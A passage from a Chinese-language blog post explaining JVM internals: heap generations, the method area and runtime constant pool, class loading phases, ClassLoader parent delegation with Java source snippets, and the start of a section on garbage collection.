1：</p><ul><li>在未开始GC的时候，对象只会存在于Eden区和名为“From”的Survivor区，Survivor区“To”是空的。</li><li>紧接着进行GC，Eden区中所有存活的对象都会被复制到“To”，而在“From”区中，仍存活的对象会根据他们的年龄值来决定去向。</li><li>年龄达到一定值(年龄阈值，可以通过-XX:MaxTenuringThreshold来设置)的对象会被移动到年老代中，没有达到阈值的对象会被复制到“To”区域。经过这次GC后，Eden区和From区已经被清空。</li><li>这个时候，“From”和“To”会交换他们的角色，也就是新的“To”就是上次GC前的“From”，新的“From”就是上次GC前的“To”。不管怎样，都会保证名为To的Survivor区域是空的。</li><li>Minor GC会一直重复这样的过程，直到“To”区被填满，“To”区被填满之后，会将所有对象移动到年老代中。</li></ul><h5 id="老生代"><a href="#老生代" class="headerlink" title="老生代"></a>老生代</h5><p>用于存放经过多次新生代GC仍然存活的对象，例如缓存对象，新建的对象也有可能直接进入老年代，主要有两种情况：</p><ul><li>大对象，可通过启动参数设置-XX:PretenureSizeThreshold=1024(单位为字节，默认为0)来代表超过多大时就不在新生代分配，而是直接在老年代分配。</li><li>大的数组对象，且数组中无引用外部对象。</li></ul><p>老年代所占的内存大小为-Xmx对应的值减去-Xmn对应的值。</p><p>如果在堆中没有内存完成实例分配，并且堆也无法再扩展时，将会抛出OutOfMemoryError异常。</p><h5 id="永生代"><a href="#永生代" class="headerlink" title="永生代"></a>永生代</h5><p>永久代可以简单理解为方法区（本质上两者并不等价）</p><p>如上文所说：对于习惯在HotSpot虚拟机上开发和部署程序的开发者来说，很多人愿意把方法区称为“永久代”，本质上两者并不等价。仅仅是因为HotSpot虚拟机的设计团队选择把GC分代收集扩展至方法区，或者说使用永久代来实现方法区而已。</p><p>对于其他虚拟机（如BEA JRockit、IBM J9等）来说是不存在永久代的概念的。</p><p>即使是HotSpot虚拟机本身，根据官方发布的路线图信息，现在也有放弃永久代并“搬家”至Native Memory来实现方法区的规划了：</p><ul><li>Jdk1.6及之前：常量池分配在永久代；</li><li>Jdk1.7：有，但已经逐步“去永久代”；</li><li>Jdk1.8及之后：没有永久代(java.lang.OutOfMemoryError: PermGen space,这种错误将不会出现在JDK1.8中)；</li></ul><h3 id="方法区（Method-Area）"><a href="#方法区（Method-Area）" class="headerlink" title="方法区（Method Area）"></a>方法区（Method Area）</h3><p>各线程共享区域。</p><h4 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h4><p><strong>方法区保存内容：类信息、常量、静态变量、即时编译器编译后的代码等数据。</strong></p><p>类信息具体内容：</p><ul><li>类型信息：全限定名、直接超类的全限定名、类的类型还是接口类型、访问修饰符、直接超接口的全限定名的有序列表</li><li>字段信息：字段名、字段类型、字段的修饰符</li><li>方法信息：方法名、方法返回类型、方法参数的数量和类型（按照顺序）、方法的修饰符</li><li>其他信息：除了常量以外的所有类（静态）变量、一个指向ClassLoader的指针、一个指向Class对象的指针、常量池（常量数据以及对其他类型的符号引用）</li></ul><h4 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h4><p>类型信息是由类加载器在类加载的过程中从类文件中提取出来的信息。</p><p>需要注意的一点是，常量池也存放于方法区中。</p><p>程序中所有的线程共享一个方法区，所以访问方法区的信息必须确保线程是安全的。如果有两个线程同时去加载一个类，那么只能有一个线程被允许去加载这个类，另一个必须等待。</p><p>在程序运行时，方法区的大小是可以改变的，程序在运行时可以扩展。</p><p>方法区也可以被垃圾回收，但条件非常严苛，必须在该类没有任何引用的情况下。</p><h4 id="已装载类详细信息"><a href="#已装载类详细信息" class="headerlink" title="已装载类详细信息"></a>已装载类详细信息</h4><ul><li><p>运行时常量池：在方法区中，每个类型都对应一个常量池，存放该类型所用到的所有常量，常量池中存储了诸如文字字符串、final变量值、类名和方法名常量。</p></li><li><p>字段信息：字段信息存放类中声明的每一个字段的信息，包括字段的名、类型、修饰符。</p></li><li><p>字段名称：指的是类或接口的实例变量或类变量，字段的描述符是一个指示字段的类型的字符串，如<code>private A a=null;</code>则a为字段名，A为描述符，private为修饰符</p></li><li><p>方法信息：类中声明的每一个方法的信息，包括方法名、返回值类型、参数类型、修饰符、异常、方法的字节码。(在编译的时候，就已经将方法的局部变量、操作数栈大小等确定并存放在字节码中，在装载的时候，随着类一起装入方法区。)</p></li><li><p>静态变量：就是类变量，类的所有实例都共享，在方法区有个静态区，静态区专门存放静态变量和静态块。</p></li><li><p>到类classloader的引用：到该类的类装载器的引用。</p></li><li><p>到类class的引用：虚拟机为每一个被装载的类型创建一个class实例，用来代表这个被装载的类。</p></li></ul><h4 id="运行时常量池"><a href="#运行时常量池" class="headerlink" title="运行时常量池"></a>运行时常量池</h4><p>Java常量池实际上分为两种形态：静态常量池和运行时常量池。方法区Method Area包含运行时常量池。</p><ul><li>静态常量池 ，即*.class文件中的常量池。class文件中的常量池不仅仅包含字符串(数字)字面量，还包含类、方法的信息，它们占用class文件绝大部分空间。</li><li>运行时常量池 ，则是jvm虚拟机在完成类装载操作后，将class文件中的常量池载入到内存中，并保存在方法区中，我们常说的常量池，就是指方法区中的运行时常量池。</li></ul><p>运行时常量池（Constant Pool Table），用于存放编译期生成的各种字面量、符号引用，String字符串、final变量值、类和结构的完全限定名，方法的名称和描述符，字段的名称和描述符，这部分内容将在类加载后存放到方法区的运行时常量池中。它们以数组形式通过索引被访问，是外部调用与类联系及类型对象化的桥梁。</p><p>在运行时，JVM从常量池中获得符号引用，然后在运行时解析成引用项的实际地址，最后通过常量池中的全限定名、方法和字段描述符，把当前类或接口中的代码与其它类或接口中的代码联系起来。</p><p>运行时常量池中的常量，基本来源于各个class文件中的常量池。</p><p>程序运行时，除非手动向常量池中添加常量(比如调用intern方法)，否则jvm不会自动添加常量到常量池。</p><p><img src="/2020/05/08/浅析JVM/5.png" alt=""></p><p>运行时常量池除了存放编译期产生的Class文件的常量外，还可存放在程序运行期间生成的新常量，比较常见增加新常量方法有String类的intern()方法。</p><p>String.intern()是一个Native方法，它的作用是：如果运行时常量池中已经包含一个等于此String对象内容的字符串，则返回常量池中该字符串的引用；如果没有，则在常量池中创建与此String内容相同的字符串，并返回常量池中创建的字符串的引用。</p><p>不过JDK7的intern()方法的实现有所不同，当常量池中没有该字符串时，不再是在常量池中创建与此String内容相同的字符串，而改为在常量池中记录堆中首次出现的该字符串的引用，并返回该引用。</p><p>由于运行时常量池在方法区中，我们可以通过JVM参数：<code>-XX:PermSize</code>、<code>-XX:MaxPermSize</code>来设置方法区大小，从而间接限制常量池大小。</p><p>在JDK8中，移除了方法区，转而用Metaspace区域替代，所以我们需要使用新的JVM参数：<code>-XX:MaxMetaspaceSize</code></p><p>但是，JDK1.7之前运行时常量池是方法区的一部分，JDK1.7及之后版本已经将运行时常量池从方法区中移了出来，在堆（Heap）中开辟了一块区域存放运行时常量池。</p><h2 id="0x04-类加载机制"><a href="#0x04-类加载机制" class="headerlink" title="0x04 类加载机制"></a>0x04 类加载机制</h2><h3 id="类加载简介"><a href="#类加载简介" class="headerlink" title="类加载简介"></a>类加载简介</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>类加载指的是将类的.class文件中的二进制数据读入到内存中，将其放在运行时数据区的方法区内，然后在堆区创建一个java.lang.Class对象，用来封装类在方法区内的数据结构。</p><h4 id="所处环节"><a href="#所处环节" class="headerlink" title="所处环节"></a>所处环节</h4><p>在介绍类加载机制之前，先来看看，类的加载机制在整个Java程序运行期间处于一个什么环节，下面使用一张图来表示：</p><p><img src="/2020/05/08/浅析JVM/9.png" alt=""></p><p>从上图可以看，Java文件通过编译器变成了.class文件，接下来类加载器又将这些.class文件加载到JVM中。其中类装载器的作用其实就是类的加载。</p><h4 id="何时才会启动类加载器"><a href="#何时才会启动类加载器" class="headerlink" title="何时才会启动类加载器"></a>何时才会启动类加载器</h4><p>其实，类加载器并不需要等到某个类被“首次主动使用”时再加载它，JVM规范允许类加载器在预料某个类将要被使用时就预先加载它，如果在预先加载的过程中遇到了.class文件缺失或存在错误，类加载器必须在程序首次主动使用该类时才报告错误（LinkageError错误）。如果这个类一直没有被程序主动使用，那么类加载器就不会报告错误。</p><h4 id="何处去加载-class文件"><a href="#何处去加载-class文件" class="headerlink" title="何处去加载.class文件"></a>何处去加载.class文件</h4><p>在这里进行一个简单的分类。例举了5个来源:</p><ol><li>本地磁盘</li><li>网上加载.class文件（Applet）</li><li>从数据库中</li><li>压缩文件中（ZAR，jar等）</li><li>从其他文件生成的（JSP应用）</li></ol><h3 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h3><h4 id="总过程"><a href="#总过程" class="headerlink" title="总过程"></a>总过程</h4><p>类从被加载到虚拟机内存中开始，到卸载出内存为止，它的整个生命周期包括：加载、验证、准备、解析、初始化、使用和卸载等七个阶段。它们的顺序如下图所示：</p><p><img src="/2020/05/08/浅析JVM/10.png" alt=""></p><p>其中类加载的过程包括了<strong>加载、验证、准备、解析、初始化</strong>五个阶段。</p><p>在这五个阶段中，加载、验证、准备和初始化这四个阶段发生的顺序是确定的，而解析阶段则不一定，它在某些情况下可以在初始化阶段之后开始。</p><p>另外注意这里的几个阶段是按顺序开始，而不是按顺序进行或完成，因为这些阶段通常都是互相交叉地混合进行的，通常在一个阶段执行的过程中调用或激活另一个阶段。</p><p>启动时如果加上如下系统参数，即可跟踪JVM类的加载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX：+TraceClassLoading</span><br></pre></td></tr></table></figure><h4 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h4><p>”加载“是”类加载机制”的第一个过程，在加载阶段，虚拟机主要完成三件事：</p><ol><li>通过一个类的全限定名来获取其定义的二进制字节流；</li><li>将这个字节流所代表的的静态存储结构转化为方法区的运行时数据结构；</li><li>在堆中生成一个代表这个类的Class对象，作为方法区中这些数据的访问入口。</li></ol><p>相对于类加载的其他阶段而言，加载阶段是可控性最强的阶段，因为程序员可以使用系统的类加载器加载，还可以使用自己的类加载器加载。我们在最后一部分会详细介绍这个类加载器。在这里我们只需要知道类加载器的作用就是上面虚拟机需要完成的三件事，仅此而已就好了。</p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>验证的主要作用就是确保被加载的类的正确性。也是连接阶段的第一步。说白了也就是我们加载好的.class文件不能对我们的虚拟机有危害，所以先检测验证一下。它主要是完成四个阶段的验证：</p><ol><li>文件格式的验证：验证.class文件字节流是否符合class文件的格式的规范，并且能够被当前版本的虚拟机处理。这里面主要对魔数、主版本号、常量池等等的校验（魔数、主版本号都是.class文件里面包含的数据信息、在这里可以不用理解）。</li><li>元数据验证：主要是对字节码描述的信息进行语义分析，以保证其描述的信息符合Java语言规范的要求，比如说验证这个类是不是有父类，类中的字段方法是不是和父类冲突等等。</li><li>字节码验证：这是整个验证过程最复杂的阶段，主要是通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。在元数据验证阶段对数据类型做出验证后，这个阶段主要对类的方法做出分析，保证类的方法在运行时不会做出危害虚拟机安全的事。</li><li>符号引用验证：它是验证的最后一个阶段，发生在虚拟机将符号引用转化为直接引用的时候。主要是对类自身以外的信息进行校验。目的是确保解析动作能够完成。</li></ol><p>对整个类加载机制而言，验证阶段是一个很重要但是非必需的阶段，如果我们的代码能够确保没有问题，那么我们就没有必要去验证，毕竟验证需要花费一定的的时间。当然我们可以使用<code>-Xverfity:none</code>来关闭大部分的验证。</p><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><p><strong>准备阶段主要为类变量分配内存并设置初始值。</strong>这些内存都在方法区分配。在这个阶段我们只需要注意两点就好了，也就是类变量和初始值两个关键词：</p><ol><li>类变量（static）会分配内存，但是实例变量不会，实例变量主要随着对象的实例化一块分配到Java堆中，</li><li>这里的初始值指的是数据类型默认值，而不是代码中被显示赋予的值。比如<code>public static int value = 1;</code> 在这里准备阶段过后的value值为0，而不是1。赋值为1的动作在初始化阶段。当然还有其他的默认值。</li></ol><p><img src="/2020/05/08/浅析JVM/11.png" alt=""></p><p>注意，在上面value是被static所修饰的准备阶段之后是0，但是如果同时被final和static修饰准备阶段之后就是1了。我们可以理解为static final在编译器就将结果放入调用它的类的常量池中了。</p><h4 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h4><p>解析阶段主要是虚拟机将常量池中的符号引用转化为直接引用的过程。什么是符号应用和直接引用呢？</p><ul><li>符号引用：以一组符号来描述所引用的目标，可以是任何形式的字面量，只要是能无歧义的定位到目标就好，就好比在班级中，老师可以用张三来代表你，也可以用你的学号来代表你，但无论任何方式这些都只是一个代号（符号），这个代号指向你（符号引用）</li><li>直接引用：直接引用是可以指向目标的指针、相对偏移量或者是一个能直接或间接定位到目标的句柄。和虚拟机实现的内存有关，不同的虚拟机直接引用一般不同。</li></ul><p>解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用点限定符7类符号引用进行。</p><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>这是类加载机制的最后一步，在这个阶段，Java程序代码才开始真正执行。我们知道，在准备阶段已经为类变量赋过一次值。在初始化阶段，程序员可以根据自己的需求来赋值了。一句话描述这个阶段就是执行类构造器<code>&lt; clinit &gt;()</code>方法的过程。</p><p>在初始化阶段，<strong>主要为类的静态变量赋予正确的初始值，JVM负责对类进行初始化，主要对类变量进行初始化。</strong>在Java中对类变量进行初始值设定有两种方式：</p><ol><li>声明类变量是指定初始值</li><li>使用静态代码块为类变量指定初始值</li></ol><p><strong>JVM初始化步骤</strong></p><p>总的来说，初始化顺序依次是：（静态变量、静态初始化块）–&gt;（变量、初始化块）–&gt; 构造器；如果有父类，则顺序是：父类static方法 –&gt; 子类static方法 –&gt; 父类构造方法- -&gt; 子类构造方法</p><ol><li>假如这个类还没有被加载和连接，则程序先加载并连接该类</li><li>假如该类的直接父类还没有被初始化，则先初始化其直接父类</li><li>假如类中有初始化语句，则系统依次执行这些初始化语句</li></ol><p><strong>类初始化时机</strong></p><p>只有当对类的主动使用的时候才会导致类的初始化，类的主动使用包括以下六种：</p><ul><li>创建类的实例，也就是new的方式</li><li>访问某个类或接口的静态变量，或者对该静态变量赋值</li><li>调用类的静态方法</li><li>反射（如<code>Class.forName(&quot;com.shengsiyuan.Test&quot;)</code>）</li><li>初始化某个类的子类，则其父类也会被初始化</li><li>Java虚拟机启动时被标明为启动类的类（ JavaTest），直接使用java.exe命令来运行某个主类</li></ul><h3 id="类加载器介绍"><a href="#类加载器介绍" class="headerlink" title="类加载器介绍"></a>类加载器介绍</h3><p>类加载器的调用顺序如下：</p><p><img src="/2020/05/08/浅析JVM/12.png" alt=""></p><p>Java默认提供的三个ClassLoader：BootStrap ClassLoader、Extension ClassLoader、App ClassLoader</p><p>加载顺序：Bootstrap ClassLoader &gt; Extention ClassLoader &gt; App ClassLoader</p><h4 id="BootStrap-ClassLoader"><a href="#BootStrap-ClassLoader" class="headerlink" title="BootStrap ClassLoader"></a>BootStrap ClassLoader</h4><p>BootStrap ClassLoader被称为启动类加载器，是Java类加载层次中最顶层的类加载器，负责加载JDK中的核心类库，如：rt.jar、resources.jar、charsets.jar等，可通过如下程序获得该类加载器从哪些地方加载了相关的jar或class文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BootStrapTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      URL[] urls = sun.misc.Launcher.getBootstrapClassPath().getURLs();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; urls.length; i++) &#123;</span><br><span class="line">          System.out.println(urls[i].toExternalForm());</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码查询结果可以通过查找 sun.boot.class.path 这个系统属性所得知的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(System.getProperty(<span class="string">"sun.boot.class.path"</span>));</span><br></pre></td></tr></table></figure><h4 id="Extension-ClassLoader"><a href="#Extension-ClassLoader" class="headerlink" title="Extension ClassLoader"></a>Extension ClassLoader</h4><p>Extension ClassLoader，扩展类加载器，负责加载Java的扩展类库，Java虚拟机的实现会提供一个扩展库目录。该类加载器在此目录里面查找并加载 Java 类。默认加载JAVA_HOME/jre/lib/ext/目下的所有jar。</p><h4 id="App-ClassLoader"><a href="#App-ClassLoader" class="headerlink" title="App ClassLoader"></a>App ClassLoader</h4><p>App ClassLoader，系统类加载器，负责加载应用程序classpath目录下的所有jar和class文件。一般来说，Java应用的类都是由它来完成加载的。可以通过<code>ClassLoader.getSystemClassLoader()</code>来获取它。</p><h4 id="Tomcat的类加载顺序"><a href="#Tomcat的类加载顺序" class="headerlink" title="Tomcat的类加载顺序"></a>Tomcat的类加载顺序</h4><p>如图：</p><p><img src="/2020/05/08/浅析JVM/13.png" alt=""></p><h3 id="双亲委托策略"><a href="#双亲委托策略" class="headerlink" title="双亲委托策略"></a>双亲委托策略</h3><h4 id="双亲委托策略内容"><a href="#双亲委托策略内容" class="headerlink" title="双亲委托策略内容"></a>双亲委托策略内容</h4><p>ClassLoader使用的是双亲委托模型来搜索类的，每个ClassLoader实例都有一个父类加载器的引用（不是继承的关系，是一个包含的关系），虚拟机内置的类加载器（Bootstrap ClassLoader）本身没有父类加载器，但可以用作其它ClassLoader实例的的父类加载器。</p><p>当一个ClassLoader实例需要加载某个类时，它会试图亲自搜索某个类之前，先把这个任务委托给它的<strong>父类加载器</strong>，这个过程是由上至下依次检查的，首先由最顶层的类加载器Bootstrap ClassLoader试图加载，如果没加载到，则把任务转交给Extension ClassLoader试图加载，如果也没加载到，则转交给App ClassLoader 进行加载，如果它也没有加载得到的话，则返回给委托的发起者，由它到指定的文件系统或网络等URL中加载该类。</p><p>如果它们都没有加载到这个类时，则抛出ClassNotFoundException异常。否则将这个找到的类生成一个类的定义，并将它加载到内存当中，最后返回这个类在内存中的Class实例对象。</p><h4 id="为什么使用双亲委托策略"><a href="#为什么使用双亲委托策略" class="headerlink" title="为什么使用双亲委托策略"></a>为什么使用双亲委托策略</h4><p>因为这样可以避免重复加载，当父亲已经加载了该类的时候，就没有必要子ClassLoader再加载一次。</p><p>考虑到安全因素，我们试想一下，如果不使用这种委托模式，那我们就可以随时使用自定义的String来动态替代Java核心API中定义的类型，这样会存在非常大的安全隐患。</p><p>而双亲委托的方式，就可以避免这种情况，因为String已经在启动时就被引导类加载器（Bootstrcp ClassLoader）加载，所以用户自定义的ClassLoader永远也无法加载一个自己写的String，除非你改变JDK中ClassLoader搜索类的默认算法。</p><h4 id="JVM在搜索类的时候，如何判断两个class相同呢？"><a href="#JVM在搜索类的时候，如何判断两个class相同呢？" class="headerlink" title="JVM在搜索类的时候，如何判断两个class相同呢？"></a>JVM在搜索类的时候，如何判断两个class相同呢？</h4><p><strong>JVM在判定两个class是否相同时，不仅要判断两个类名是否相同，而且要判断是否由同一个类加载器实例加载的。</strong></p><p>只有两者同时满足的情况下，JVM才认为这两个class是相同的。就算两个class是同一份class字节码，如果被两个不同的ClassLoader实例所加载，JVM也会认为它们是两个不同class。</p><p>比如网络上的一个Java类org.classloader.simple.NetClassLoaderSimple，javac编译之后生成字节码文件NetClassLoaderSimple.class，ClassLoaderA和ClassLoaderB这两个类加载器并读取了NetClassLoaderSimple.class文件，并分别定义出了java.lang.Class实例来表示这个类。</p><p>对于JVM来说，它们是两个不同的实例对象，但它们确实是同一份字节码文件，如果试图将这个Class实例生成具体的对象进行转换时，就会抛运行时异常java.lang.ClassCaseException，提示这是两个不同的类型。</p><p>在一个单虚拟机环境下，标识一个类有两个因素：class的全路径名、该类的ClassLoader。</p><p><img src="/2020/05/08/浅析JVM/14.png" alt=""></p><h4 id="不遵循“双亲委托机制”的场景"><a href="#不遵循“双亲委托机制”的场景" class="headerlink" title="不遵循“双亲委托机制”的场景"></a>不遵循“双亲委托机制”的场景</h4><p>上面说了双亲委托机制主要是为了实现不同的ClassLoader之间加载的类的交互问题，被大家公用的类就交由父加载器去加载，但是Java中确实也存在父类加载器加载的类需要用到子加载器加载的类的情况。</p><p>Java中有一个SPI(Service Provider Interface)标准。</p><p>使用了SPI的库，比如JDBC、JNDI等，我们都知道JDBC需要第三方提供的驱动才可以，而驱动的jar包是放在我们应用程序本身的classpath的，而JDBC本身的API是JDK提供的一部分，它已经被bootstrap加载了，那第三方厂商提供的实现类怎么加载呢？</p><p>这里面Java引入了线程上下文类加载的概念，线程类加载器默认会从父线程继承，如果没有指定的话，默认就是系统类加载器（App ClassLoader），这样的话当加载第三方驱动的时候，就可以通过线程的上下文类加载器来加载。</p><p>另外为了实现更灵活的类加载器OSGI以及一些Java app server也打破了双亲委托机制。</p><h3 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h3><p>看到Java为我们提供了三个类加载器，应用程序都是由这三种类加载器互相配合进行加载的，如果有必要，我们还可以加入自定义的类加载器。</p><h4 id="如何自定义类加载"><a href="#如何自定义类加载" class="headerlink" title="如何自定义类加载"></a>如何自定义类加载</h4><p>以下两个步骤：</p><ul><li>继承java.lang.ClassLoader；</li><li>覆写父类的findClass()方法；</li></ul><h4 id="几个关键的方法"><a href="#几个关键的方法" class="headerlink" title="几个关键的方法"></a>几个关键的方法</h4><h5 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h5><ul><li><code>defineClass(byte[], int, int)</code>：把字节数组b中的内容转换成 Java 类，返回的结果是java.lang.Class类的实例。这个方法被声明为final的；</li><li><code>findClass(String name)</code>：查找名称为name的类，返回的结果是java.lang.Class类的实例；</li><li><code>loadClass(String name)</code>：加载名称为name的类，返回的结果是java.lang.Class类的实例；</li><li><code>resolveClass(Class&lt;?&gt;)</code>：链接指定的 Java 类；</li></ul><h5 id="方法使用"><a href="#方法使用" class="headerlink" title="方法使用"></a>方法使用</h5><p><strong>(1) loadClass()方法</strong></p><p>方法定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name)  <span class="keyword">throws</span> ClassNotFoundException</span><br></pre></td></tr></table></figure><p>方法的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException&#123;  </span><br><span class="line">    <span class="keyword">return</span> loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面可以看出loadClass方法调用了<code>loadClass(name, false)</code>方法，那么接下来我们再来看看另外一个loadClass()方法的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)  <span class="keyword">throws</span> ClassNotFoundException   </span><br><span class="line">&#123; <span class="comment">// First, check if the class has already been loaded  Class c = findLoadedClass(name);</span></span><br><span class="line"><span class="comment">//检查class是否已经被加载过了  </span></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="keyword">null</span>)&#123;     </span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (parent != <span class="keyword">null</span>)&#123;</span><br><span class="line">                c = parent.loadClass(name, <span class="keyword">false</span>); <span class="comment">//如果没有被加载，且指定了父类加载器，则委托父加载器加载。    </span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                c = findBootstrapClass0(name);<span class="comment">//如果没有父类加载器，则委托bootstrap加载器加载&#125; </span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            <span class="comment">// If still not found, then invoke findClass in order          </span></span><br><span class="line">            <span class="comment">// to find the class.         </span></span><br><span class="line">            c = findClass(name);<span class="comment">//如果父类加载没有加载到，则通过自己的findClass来加载。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(resolve)&#123;</span><br><span class="line">        resolveClass(c); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码，通过注释可以清晰看出loadClass()的双亲委托机制是如何工作的。 这里我们需要注意一点就是<code>public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException</code>没有被标记为final，也就<strong>意味着我们是可以override这个方法的，也就是说双亲委托机制是可以打破的</strong>。另外上面注意到有个findClass()方法，接下来我们就来说说这个方法到底是做什么的。</p><p><strong>(2) findClass()方法</strong></p><p>我们查看java.lang.ClassLoader的源代码，我们发现findClass的实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看出此方法默认的实现是直接抛出异常，其实这个方法就是留给我们应用程序来override的。那么具体的实现就看你的实现逻辑了，你可以从磁盘读取，也可以从网络上获取class文件的字节流，获取class二进制了以后就可以交给defineClass来实现进一步的加载。defineClass我们在下面再来描述。</p><p><strong>(3) defineClass方法</strong></p><p>defineClass的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)  <span class="keyword">throws</span> ClassFormatError&#123;     </span><br><span class="line">    <span class="keyword">return</span> defineClass(name, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的代码我们看出此方法被定义为了final，这也就意味着此方法不能被Override，其实这也是JVM留给我们的唯一的入口，通过这个唯一的入口，JVM保证了类文件必须符合Java虚拟机规范规定的类的定义。此方法最后会调用native的方法来实现真正的类的加载工作。</p><h2 id="0x05-JVM垃圾回收机制GC"><a href="#0x05-JVM垃圾回收机制GC" class="headerlink" title="0x05 JVM垃圾回收机制GC"></a>0x05 JVM垃圾回收机制GC</h2><h3 id="JVM内存空间介绍"><a href="#JVM内存空间介绍" class="headerlink" title="JVM内存空间介绍"></a>JVM内存空间介绍</h3><p>在前面已经具体介绍过。</p><p>JVM的内存空间，从大的层面上来分析包含：新生代空间（Young）和老年代空间（Old）。新生代空间（Young）又被分为2个部分（Eden区域、Survivous区域）和3个板块（1个Eden区域和2个Survivous区域）。</p><p><img src="/2020/05/08/浅析JVM/15.png" alt=""></p><p>下面来看下具体每部分都是用来干什么的：</p><ul><li><p>Eden(伊甸园)区域：用来存放使用new或者newInstance等方式创建的对象，默认这些对象都是存放在Eden区，除非这个对象太大，或者超出了设定的阈值<code>-XX:PretenureSizeThresold</code>，这样的对象会被直接分配到Old区域。</p></li><li><p>2个Survivous(幸存)区域：一般称为S0、S1，理论上一样大。</p></li></ul><h3 id="针对不同代的垃圾回收机制"><a href="#针对不同代的垃圾回收机制" class="headerlink" title="针对不同代的垃圾回收机制"></a>针对不同代的垃圾回收机制</h3><h4 id="新生代（Young-generation）"><a href="#新生代（Young-generation）" class="headerlink" title="新生代（Young generation）"></a>新生代（Young generation）</h4><p>绝大多数最新被创建的对象都会被分配到这里，由于大部分在创建后很快变得不可达，很多对象被创建在新生代，然后“消失”。对象从这个区域“消失”的过程我们称之为：Minor GC 。</p><h4 id="老年代（Old-generation）"><a href="#老年代（Old-generation）" class="headerlink" title="老年代（Old generation）"></a>老年代（Old generation）</h4><p>对象没有变得不可达，并且从新生代周期中存活了下来，会被拷贝到这里。其区域分配的空间要比新生代多。也正由于其相对大的空间，发生在老年代的GC次数要比新生代少得多。对象从老年代中消失的过程，称之为：Major GC或者Full GC。</p><h4 id="持久代（Permanent-generation）"><a href="#持久代（Permanent-generation）" class="headerlink" title="持久代（Permanent generation）"></a>持久代（Permanent generation）</h4><p>这个区域不是用于存储那些从老年代存活下来的对象，这个区域也可能发生GC。发生在这个区域的GC事件也被算为Major 